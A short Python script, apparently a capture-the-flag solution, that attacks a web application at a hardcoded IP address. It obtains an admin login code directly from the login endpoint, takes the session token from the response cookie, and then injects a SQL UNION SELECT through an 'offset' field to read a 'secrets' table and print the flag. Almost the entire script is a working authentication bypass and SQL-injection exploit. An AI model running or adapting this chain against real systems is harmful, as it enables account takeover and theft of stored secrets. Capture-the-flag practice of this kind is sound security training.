import datetime
import requests

# Get the login code for the admin account
host = "http://35.207.132.47/"
code_data = {"email": "admin"}
code_request = requests.post(host + "/api/login", json=code_data)
code = code_request.text

# Log in to the admin account and get token
login_data = {"code": code}
login_request = requests.post(host + "/api/verify", json=login_data)
login = login_request.headers
token = login["Set-Cookie"].split("token=")[1].split(';')[0]

cookies = {"token": token, "name": "admin"}
inject = str(datetime.datetime.now()) + "' UNION SELECT secret, NULL, NULL, NULL, NULL, NULL, NULL, NULL FROM secrets --"
flag_data = {"offset": inject, "sorting": "lastmodified"}
flag_request = requests.post(host + "/api/getprojectsadmin", json=flag_data, cookies=cookies)
text = flag_request.text
flag = text.split("\"code\":\"")[1].split('"')[0]
print(flag)
